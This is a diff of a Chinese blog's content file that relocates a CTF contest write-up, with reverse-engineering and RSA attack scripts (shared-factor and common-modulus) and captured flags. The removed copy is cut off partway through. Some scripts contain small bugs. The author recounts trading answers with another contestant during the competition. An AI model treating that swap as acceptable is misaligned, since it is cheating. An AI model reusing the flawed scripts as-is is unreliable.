class="number">20522772249591436865905796103232542494211695376973377722875606678999899690405480809231671346489821878050354380591999935960795888483664473952207298504196203830543208477229162177648586683957831016664569242538775928728009699300145355818417233892295367828930893733774091897666206696635744262884229680137381841581000794056156842812583057103472764486608022028638288161256424936523444974815727764620634174112474612238992061186937613171878635903455700636894570504376153482600057655480654731180740098435209814585459376319844315388048636156465832997913885636776523217188604040216732137108997444787157007665652718553013424347649</span></span><br><span class="line">c2=<span class="number">18715009944766815149492560645051626329204114049927707292306481018724323433701970253541495090244787378826569549885480491764057526828531429033378143426272248940256432423939977805246742287886281853484696625486522535042794403288199393432900065504766428665320682811338887618389589263597065738414638013423594446322359052784842619755053094028050245325637698678444632860097510081832077842610716042473697478416213915805481704537884611126069907812621750817901278803326304784057145916721693930579344441283586458621033705530309835431139751025999089707480829034535026967779441379062426254038310930863215188888662357133997908688736</span></span><br><span class="line">e=<span class="number">65537</span></span><br></pre></td></tr></table></figure>
+<p>经检验得n1,n2不互质，可以参考 <a href="https://zhuanlan.zhihu.com/p/76228394">https://zhuanlan.zhihu.com/p/76228394</a> 中的方法进行解密。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line">c1 = ... </span><br><span class="line">c2 = ... </span><br><span class="line">n1 = ...</span><br><span class="line">n2 = ...</span><br><span class="line">e = <span class="number">65537</span>    </span><br><span class="line">p12 = gmpy2.gcd(n1, n2)  </span><br><span class="line"><span class="keyword">assert</span> (p12 != <span class="number">1</span>)  </span><br><span class="line">q1 = n1 / p12  </span><br><span class="line">q2 = n2 / p12  </span><br><span class="line">d1 = gmpy2.invert(e, (p12 - <span class="number">1</span>) * (q1 - <span class="number">1</span>))  </span><br><span class="line">d2 = gmpy2.invert(e, (p12 - <span class="number">1</span>) * (q2 - <span class="number">1</span>))  </span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, n1)  </span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, n2)  </span><br><span class="line"><span class="built_in">print</span> long_to_bytes(m1)+long_to_bytes(m2)  </span><br></pre></td></tr></table></figure>
+<p><strong>flag{afb1e6f2-9acb-efde-ad7c-246a99d8f1fd}</strong></p>
+<h2 id="4-拼图"><a href="#4-拼图" class="headerlink" title="4. 拼图"></a>4. 拼图</h2><p>或许可以写脚本做这道题，但是我不会，只能肉眼观察与众不同的图片，拼接成这样一幅图：<br>（使用了PowerPoint编辑的）</p>
+<p><img src="/2021/09/25/ctf02/b.png"></p>
+<p>做到这儿我就不大会了，然而此时名次大概在30+，离线下还差几名。而且我恰好卡在一个看上去马上要做出来的misc题上：</p>
+<p>于是我找到了那位安徽的同学（见超短裙子回忆录的第十二章，经过了一个暑假的磨练，他变强了许多），打算跟他做py交易。我把那道reverse的解法给他，他就给我了这道题的wp。</p>
+<blockquote>
+<p>提交了flag{Hamsters_are_so_cute}发现答案不正确。</p>
+<p>考虑到cute右边没有立即跟上右括号，说明cute的右边可能含有一些标点来占位。</p>
+<p>容易忽略的标点符号有“！“和”|“，因为它会与大括号相混导致误判。</p>
+<p>通过对cute后面加1~5个“！“与”|“，成功试出来了正确的flag</p>
+<p><strong>flag{Hamsters_are_so_cute!!!}</strong></p>
+</blockquote>
+<p>这™谁想得到啊！！！</p>
+<h2 id="5-Crypto1"><a href="#5-Crypto1" class="headerlink" title="5. Crypto1"></a>5. Crypto1</h2><p>眼看离比赛结束就只有20分钟了，虽然此时的我rk22，但按照上次比赛的惯例，最后的名次肯定飞速下降，必须要再AC一道题才能稳住线下赛的资格。</p>
+<p>于是那位同学好心给了我这道题的flag与wp，想让我陪他一起面基：</p>
+<blockquote>
+<p>我们有：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">96722669749951212913756678234358651184134068407812470434435916603156818917545841439779031943800634250032106764154804309935557678512858630048212204696471487762160744924838010746445510979202735123140536599975731157563069594497905809587369126155476201977830809090473053692189364335223367147692962090288185113654598050169422517553085833257142179937154768657039042632343562454149914801329414293361879935460883633117988279426277638667508115319494914342600199690237441851088350726869553691992122821267990343643644523989413546160765907845604067031798179773495433134648132709349683621175243064236059479837244518879574919017301667066698329442453248971033564328161407342561250703168154214939772631586519304164853651</span></span><br><span class="line">c1=<span class="number">66738113223447221430009739914948303261002811553064307532926788024694319846909340806982708347904688420671656410554852340732395818007063648478593071665936277836988050526188064146099581039172667768507259894363266310279948729552649788129953872816024709989260060633285022337107662251504618369065597018450927041881262189584381809106166042131798086882746986243210896131714227544235843922107304728228549916171484199199612243776469423359120753888158616202476325705252715374109256790899923317253605743212561589807498078080069511918514647943399566630574192829185904868376879831247378819590121286186417825591746918495311372015707767009078229770450338244309693800180936418605756818618708750868807720566288044943952844</span></span><br><span class="line">c2=<span class="number">88330949146651042517337653740810385187361689012501792799900873279978736035790659211001047937337215121948527017022967642906632732136313750277237761910710915459733551421653259986088596828049455592613225962133163865584111828012197112528645520371075411167515961263199635568730334149461654340122507778194391601956023625429418297129608911450200836427221311442323768087256798964844787274408624548839536279704401007441198390922847003287643673183230633728790263593607595427088882078742699027563601046309308221108391158848644822374865676056755011459026909057983805069264236657111115914570543103494726584296335044897998794251877515750910330960179539465060133592380802344398038815679281272098815068185059127533110716</span></span><br><span class="line">e1=<span class="number">49</span></span><br><span class="line">e2=<span class="number">35</span></span><br></pre></td></tr></table></figure>
+<p>很明显是共模攻击的模型，但是e1与e2并不互质，最大公约数为7。</p>
+<p>这里需要将e1与e2同时/7，从而m变为了$ m^7 $</p>
+<p>这时就可以使用低加密指数攻击了，题目代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># py2 sameNAttack.py</span></span><br><span class="line"><span class="keyword">import</span> primefac</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">n=...</span><br><span class="line">e1=...</span><br><span class="line">e2=...</span><br><span class="line">c1=...</span><br><span class="line">c2=...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">same_n_attack</span>(<span class="params">n,e1,e2,c1,c2</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a,b</span>):</span><br><span class="line">        x, lastX = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">        y, lastY = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (b != <span class="number">0</span>):</span><br><span class="line">            q = a // b</span><br><span class="line">            a, b = b, a % b</span><br><span class="line">            x, lastX = lastX - q * x, x</span><br><span class="line">            y, lastY = lastY - q * y, y</span><br><span class="line">        <span class="keyword">return</span> (lastX, lastY)</span><br><span class="line">    s = egcd(e1,e2)</span><br><span class="line">    s1 = s[<span class="number">0</span>]</span><br><span class="line">    s2 = s[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = -s1</span><br><span class="line">        c1 = primefac.modinv(c1, n)</span><br><span class="line">        <span class="keyword">if</span> c1 &lt; <span class="number">0</span>:</span><br><span class="line">            c1 += n</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = -s2</span><br><span class="line">        c2 = primefac.modinv(c2, n)</span><br><span class="line">        <span class="keyword">if</span> c2 &lt; <span class="number">0</span>:</span><br><span class="line">            c2 += n</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n)) % n</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> gmpy2.iroot(m + i * n, <span class="number">7</span>)[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(m + i * n, <span class="number">7</span>)[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">c = res = <span class="built_in">str</span>(<span class="built_in">hex</span>(same_n_attack(n,e1,e2,c1,c2)))[<span class="number">2</span>:-<span class="number">128</span>]</span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(res),<span class="number">2</span>):</span><br><span class="line">  ch = res[i]+res[i+<span class="number">1</span>]</span><br><span class="line">  flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(ch,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>
+<p><strong>flag{8ac9f9e3-82ba-ff7e-ac7b-235a02d891ef}</strong></p>
+</blockquote>
+<h2 id="6-结局"><a href="#6-结局" class="headerlink" title="6. 结局"></a>6. 结局</h2><p>谁知道py的不止一个，而且越往后名次掉的越快（真卷），在比赛结束前30s，我的名次成功从rk24掉到了rk25，成功错失了进线下赛的资格（其实也好，反正我线下啥也不会，只会自闭）。</p>
+<p>但是，这种曲线也太**了吧。</p>
+<p><img src="/2021/09/25/ctf02/c.png"></p>
+<p><del>希望自己不被发现，前面踢掉一个。</del></p>
+<h2 id="7-等re2与misc2出来再补"><a href="#7-等re2与misc2出来再补" class="headerlink" title="7. 等re2与misc2出来再补"></a>7. 等re2与misc2出来再补</h2><h2 id="8-updated-on-10-2"><a href="#8-updated-on-10-2" class="headerlink" title="8. (updated on 10.2)"></a>8. (updated on 10.2)</h2><p>好家伙，我居然进线下赛了。</p>
+<p>本来以为是因为前面有人没写wp或者py被发现，被踢了。结果是因为23~26名分数都一样，于是就都进了。</p>
+<p>比赛时间10.16~10.17，刚好可以逃掉寝室文化节的大寝表演，快哉快哉！</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>crypto</tag>
+        <tag>reverse</tag>
+        <tag>cpp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>强网杯线下公费游记</title>
     <url>/2021/10/17/ctf03.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>发现一个有趣的现象，线上的第一名在线下得了零分；而线下的第一名在线上基本上是垫底进的决赛。</p>
@@ -942,69 +1005,6 @@
         <tag>crypto</tag>
         <tag>misc</tag>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强网杯出土记</title>
-    <url>/2021/09/25/ctf02.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>经过上次的失败经历后，我相信即将到来的强网杯青少年赛会阳间许多，而事实却并不是这样。</p>
-<p>以下按做题顺序写wp（这次就我一个人做出来题可还行）：</p>
-<span id="more"></span>
-<h2 id="1-签到"><a href="#1-签到" class="headerlink" title="1. 签到"></a>1. 签到</h2><p>打开exe可以直接看到flag（<strong>很开心拿到一血</strong>）</p>
-<p><strong>flag{鲸鱼带你进入鲸奇世界}</strong></p>
-<h2 id="2-Lihua’s-for"><a href="#2-Lihua’s-for" class="headerlink" title="2. Lihua’s for"></a>2. Lihua’s for</h2><p>第一步查壳：</p>
-<p><img src="/2021/09/25/ctf02/a.png"></p>
-<p>第二步打开64位ida，定位到主函数</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> flag[<span class="number">42</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> a[<span class="number">42</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> b[<span class="number">42</span>]; <span class="comment">// [rsp+100h] [rbp+80h]</span></span><br><span class="line">  <span class="type">int</span> i_0; <span class="comment">// [rsp+1B4h] [rbp+134h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1B8h] [rbp+138h]</span></span><br><span class="line">  <span class="type">int</span> good; <span class="comment">// [rsp+1BCh] [rbp+13Ch]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  qmemcpy(a, &amp;unk_403040, <span class="keyword">sizeof</span>(a));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input flag&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">  <span class="built_in">puts</span>(flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">    b[i] = i ^ flag[i];</span><br><span class="line">  <span class="keyword">for</span> ( i_0 = <span class="number">0</span>; i_0 &lt;= <span class="number">41</span>; ++i_0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a[i_0] != b[i_0] )</span><br><span class="line">    &#123;</span><br><span class="line">      good = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    good = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( good == <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;good~&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以发现程序的原理是将用户输入的flag[i]跟i异或后与a[i]比较。</p>
-<p> 第三步直接把a[i]的值dump出来，编写exp即可解出flag。</p>
-<p> （又水了一道reverse签到题）</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> a[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x16</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> t=<span class="number">1</span>;t&lt;<span class="number">255</span>;t++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span>((i^t)==a[i*<span class="number">4</span>])</span><br><span class="line">            &#123;cout&lt;&lt;<span class="built_in">char</span>(t);<span class="keyword">break</span>;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>flag{a41be465-a50f-4124-b7ba-2766aff6baf2}</strong></p>
-<h2 id="3-Crypto2"><a href="#3-Crypto2" class="headerlink" title="3. Crypto2"></a>3. Crypto2</h2><p>给定：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n1=<span class="number">20663949646446787716947370247427064802032290773674573417491154934657966734874241036307633567695175131014840617208051931753476223149652427133485160771068994073566431652969243962290116898345337189704974833817335135391974497754670322430159624252007005736522065638860351992074099453212550475552692645688800084354832716662142860413158369020005830095049988807931794736876563293916525328174812726514626029103506607813186690909585870115364600969148482617083817273910020722354923244093624032174432568413187131385994452769295894606345768596899824635672699945050103814681553981019917552667794514804359500108947102234376726009329</span></span><br><span class="line">n2=<span class="number">23260834024376640092536888922041147168387702014814910549469730354688848760379274203088716649609675449936234732528778557041701524981200368996310064584479657042098426164366286670115392015865853892816983885530312074073396422301009513106258655315791720535737587913264728919869055970993613641008348186263870234072422880033882864603438907070864271470483691729705421547143623305055532339107777314310976947392833395180922324243244784018964736826235018388498516438612962123562977736924674510730898077787055367234786519915374446506561992135856904927351307275140543635152771670410211235702283822782412971646092584646758107766061</span></span><br><span class="line">c1=<span class="number">20522772249591436865905796103232542494211695376973377722875606678999899690405480809231671346489821878050354380591999935960795888483664473952207298504196203830543208477229162177648586683957831016664569242538775928728009699300145355818417233892295367828930893733774091897666206696635744262884229680137381841581000794056156842812583057103472764486608022028638288161256424936523444974815727764620634174112474612238992061186937613171878635903455700636894570504376153482600057655480654731180740098435209814585459376319844315388048636156465832997913885636776523217188604040216732137108997444787157007665652718553013424347649</span></span><br><span class="line">c2=<span class="number">18715009944766815149492560645051626329204114049927707292306481018724323433701970253541495090244787378826569549885480491764057526828531429033378143426272248940256432423939977805246742287886281853484696625486522535042794403288199393432900065504766428665320682811338887618389589263597065738414638013423594446322359052784842619755053094028050245325637698678444632860097510081832077842610716042473697478416213915805481704537884611126069907812621750817901278803326304784057145916721693930579344441283586458621033705530309835431139751025999089707480829034535026967779441379062426254038310930863215188888662357133997908688736</span></span><br><span class="line">e=<span class="number">65537</span></span><br></pre></td></tr></table></figure>
-<p>经检验得n1,n2不互质，可以参考 <a href="https://zhuanlan.zhihu.com/p/76228394">https://zhuanlan.zhihu.com/p/76228394</a> 中的方法进行解密。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line">c1 = ... </span><br><span class="line">c2 = ... </span><br><span class="line">n1 = ...</span><br><span class="line">n2 = ...</span><br><span class="line">e = <span class="number">65537</span>    </span><br><span class="line">p12 = gmpy2.gcd(n1, n2)  </span><br><span class="line"><span class="keyword">assert</span> (p12 != <span class="number">1</span>)  </span><br><span class="line">q1 = n1 / p12  </span><br><span class="line">q2 = n2 / p12  </span><br><span class="line">d1 = gmpy2.invert(e, (p12 - <span class="number">1</span>) * (q1 - <span class="number">1</span>))  </span><br><span class="line">d2 = gmpy2.invert(e, (p12 - <span class="number">1</span>) * (q2 - <span class="number">1</span>))  </span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, n1)  </span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, n2)  </span><br><span class="line"><span class="built_in">print</span> long_to_bytes(m1)+long_to_bytes(m2)  </span><br></pre></td></tr></table></figure>
-<p><strong>flag{afb1e6f2-9acb-efde-ad7c-246a99d8f1fd}</strong></p>
-<h2 id="4-拼图"><a href="#4-拼图" class="headerlink" title="4. 拼图"></a>4. 拼图</h2><p>或许可以写脚本做这道题，但是我不会，只能肉眼观察与众不同的图片，拼接成这样一幅图：<br>（使用了PowerPoint编辑的）</p>
-<p><img src="/2021/09/25/ctf02/b.png"></p>
-<p>做到这儿我就不大会了，然而此时名次大概在30+，离线下还差几名。而且我恰好卡在一个看上去马上要做出来的misc题上：</p>
-<p>于是我找到了那位安徽的同学（见超短裙子回忆录的第十二章，经过了一个暑假的磨练，他变强了许多），打算跟他做py交易。我把那道reverse的解法给他，他就给我了这道题的wp。</p>
-<blockquote>
-<p>提交了flag{Hamsters_are_so_cute}发现答案不正确。</p>
-<p>考虑到cute右边没有立即跟上右括号，说明cute的右边可能含有一些标点来占位。</p>
-<p>容易忽略的标点符号有“！“和”|“，因为它会与大括号相混导致误判。</p>
-<p>通过对cute后面加1~5个“！“与”|“，成功试出来了正确的flag</p>
-<p><strong>flag{Hamsters_are_so_cute!!!}</strong></p>
-</blockquote>
-<p>这™谁想得到啊！！！</p>
-<h2 id="5-Crypto1"><a href="#5-Crypto1" class="headerlink" title="5. Crypto1"></a>5. Crypto1</h2><p>眼看离比赛结束就只有20分钟了，虽然此时的我rk22，但按照上次比赛的惯例，最后的名次肯定飞速下降，必须要再AC一道题才能稳住线下赛的资格。</p>
-<p>于是那位同学好心给了我这道题的flag与wp，想让我陪他一起面基：</p>
-<blockquote>
-<p>我们有：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">96722669749951212913756678234358651184134068407812470434435916603156818917545841439779031943800634250032106764154804309935557678512858630048212204696471487762160744924838010746445510979202735123140536599975731157563069594497905809587369126155476201977830809090473053692189364335223367147692962090288185113654598050169422517553085833257142179937154768657039042632343562454149914801329414293361879935460883633117988279426277638667508115319494914342600199690237441851088350726869553691992122821267990343643644523989413546160765907845604067031798179773495433134648132709349683621175243064236059479837244518879574919017301667066698329442453248971033564328161407342561250703168154214939772631586519304164853651</span></span><br><span class="line">c1=<span class="number">66738113223447221430009739914948303261002811553064307532926788024694319846909340806982708347904688420671656410554852340732395818007063648478593071665936277836988050526188064146099581039172667768507259894363266310279948729552649788129953872816024709989260060633285022337107662251504618369065597018450927041881262189584381809106166042131798086882746986243210896131714227544235843922107304728228549916171484199199612243776469423359120753888158616202476325705252715374109256790899923317253605743212561589807498078080069511918514647943399566630574192829185904868376879831247378819590121286186417825591746918495311372015707767009078229770450338244309693800180936418605756818618708750868807720566288044943952844</span></span><br><span class="line">c2=<span class="number">88330949146651042517337653740810385187361689012501792799900873279978736035790659211001047937337215121948527017022967642906632732136313750277237761910710915459733551421653259986088596828049455592613225962133163865584111828012197112528645520371075411167515961263199635568730334149461654340122507778194391601956023625429418297129608911450200836427221311442323768087256798964844787274408624548839536279704401007441198390922847003287643673183230633728790263593607595427088882078742699027563601046309308221108391158848644822374865676056755011459026909057983805069264236657111115914570543103494726584296335044897998794251877515750910330960179539465060133592380802344398038815679281272098815068185059127533110716</span></span><br><span class="line">e1=<span class="number">49</span></span><br><span class="line">e2=<span class="number">35</span></span><br></pre></td></tr></table></figure>
-<p>很明显是共模攻击的模型，但是e1与e2并不互质，最大公约数为7。</p>
-<p>这里需要将e1与e2同时/7，从而m变为了$ m^7 $</p>
-<p>这时就可以使用低加密指数攻击了，题目代码如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># py2 sameNAttack.py</span></span><br><span class="line"><span class="keyword">import</span> primefac</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">n=...</span><br><span class="line">e1=...</span><br><span class="line">e2=...</span><br><span class="line">c1=...</span><br><span class="line">c2=...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">same_n_attack</span>(<span class="params">n,e1,e2,c1,c2</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a,b</span>):</span><br><span class="line">        x, lastX = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">        y, lastY = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (b != <span class="number">0</span>):</span><br><span class="line">            q = a // b</span><br><span class="line">            a, b = b, a % b</span><br><span class="line">            x, lastX = lastX - q * x, x</span><br><span class="line">            y, lastY = lastY - q * y, y</span><br><span class="line">        <span class="keyword">return</span> (lastX, lastY)</span><br><span class="line">    s = egcd(e1,e2)</span><br><span class="line">    s1 = s[<span class="number">0</span>]</span><br><span class="line">    s2 = s[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = -s1</span><br><span class="line">        c1 = primefac.modinv(c1, n)</span><br><span class="line">        <span class="keyword">if</span> c1 &lt; <span class="number">0</span>:</span><br><span class="line">            c1 += n</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = -s2</span><br><span class="line">        c2 = primefac.modinv(c2, n)</span><br><span class="line">        <span class="keyword">if</span> c2 &lt; <span class="number">0</span>:</span><br><span class="line">            c2 += n</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n)) % n</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> gmpy2.iroot(m + i * n, <span 